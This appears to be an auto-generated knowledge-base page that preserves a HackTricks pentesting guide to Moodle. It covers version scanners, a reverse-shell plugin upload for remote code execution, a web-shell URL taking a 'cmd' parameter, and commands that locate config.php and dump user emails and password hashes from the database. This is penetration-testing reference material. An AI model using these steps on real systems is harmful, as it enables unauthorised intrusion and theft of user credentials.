---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Moodle

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-network-services-pentesting-pentesting-web-moodle` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/moodle.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Moodle](../../topics/network-services-pentesting/moodle.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-network-services-pentesting-pentesting-web-moodle |
| name | Moodle |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/moodle.md |

## Preserved Source Material

````yaml
_body: "# Moodle\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Automatic Scans\n\n### droopescan\n\n```bash\n\
  pip3 install droopescan\ndroopescan scan moodle -u http://moodle.example.com/<moodle_path>/\n\n[+] Plugins found:\n    forum\
  \ http://moodle.schooled.htb/moodle/mod/forum/\n        http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt\n      \
  \  http://moodle.schooled.htb/moodle/mod/forum/version.php\n\n[+] No themes found.\n\n[+] Possible version(s):\n    3.10.0-beta\n\
  \n[+] Possible interesting urls found:\nStatic readme file. - [http://moodle.schooled.htb/moodle/README.txt](http://moodle.schooled.htb/moodle/README.txt)\n\
  Admin panel - [http://moodle.schooled.htb/moodle/login/](http://moodle.schooled.htb/moodle/login/)\n\n[+] Scan finished\
  \ (0:00:05.643539 elapsed)\n```\n\n### moodlescan\n\n```bash\n#Install from https://github.com/inc0d3/moodlescan\npython3\
  \ moodlescan.py -k -u http://moodle.example.com/<moodle_path>/\n\nVersion 0.7 - Dic/2020\n.............................................................................................................\n\
  \nBy Victor Herrera - supported by www.incode.cl\n\n.............................................................................................................\n\
  \nGetting server information http://moodle.schooled.htb/moodle/ ...\n\nserver         \t: Apache/2.4.46 (FreeBSD) PHP/7.4.15\n\
  x-powered-by   \t: PHP/7.4.15\nx-frame-options\t: sameorigin\nlast-modified  \t: Wed, 07 Apr 2021 21:33:41 GMT\n\nGetting\
  \ moodle version...\n\nVersion found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta\n\n\
  Searching vulnerabilities...\n\n\nVulnerabilities found: 0\n\nScan completed.\n```\n\n### CMSMap\n\n```bash\npip3 install\
  \ git+https://github.com/dionach/CMSmap.git\ncmsmap http://moodle.example.com/<moodle_path>\n```\n\n### CVEs\n\nI found\
  \ that the automatic tools are pretty **useless finding vulnerabilities affecting the moodle version**. You can **check**\
  \ for them in [**https://snyk.io/vuln/composer:moodle%2Fmoodle**](https://snyk.io/vuln/composer:moodle%2Fmoodle)\n\n## **RCE**\n\
  \nYou need to have **manager** role and you **can install plugins** inside the **\"Site administration\"** tab**:**\n\n\
  ![](<../../images/image (630).png>)\n\nIf you are manager you may still need to **activate this option**. You can see how\
  \ ins the moodle privilege escalation PoC: [https://github.com/HoangKien1020/CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321).\n\
  \nThen, you can **install the following plugin** that contains the classic pentest-monkey php r**ev shell** (_before uploading\
  \ it you need to decompress it, change the IP and port of the revshell and crompress it again_)\n\n{{#file}}\nmoodle-rce-plugin.zip\n\
  {{#endfile}}\n\nOr you could use the plugin from [https://github.com/HoangKien1020/Moodle_RCE](https://github.com/HoangKien1020/Moodle_RCE)\
  \ to get a regular PHP shell with the \"cmd\" parameter.\n\nTo access launch the malicious plugin you need to access to:\n\
  \n```bash\nhttp://domain.com/<moodle_path>/blocks/rce/lang/en/block_rce.php?cmd=id\n```\n\n## POST\n\n### Find database\
  \ credentials\n\n```bash\nfind / -name \"config.php\" 2>/dev/null | grep \"moodle/config.php\"\n```\n\n### Dump Credentials\
  \ from database\n\n```bash\n/usr/local/bin/mysql -u <username> --password=<password> -e \"use moodle; select email,username,password\
  \ from mdl_user; exit\"\n```\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: network-services-pentesting/pentesting-web/moodle.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/moodle.md
````
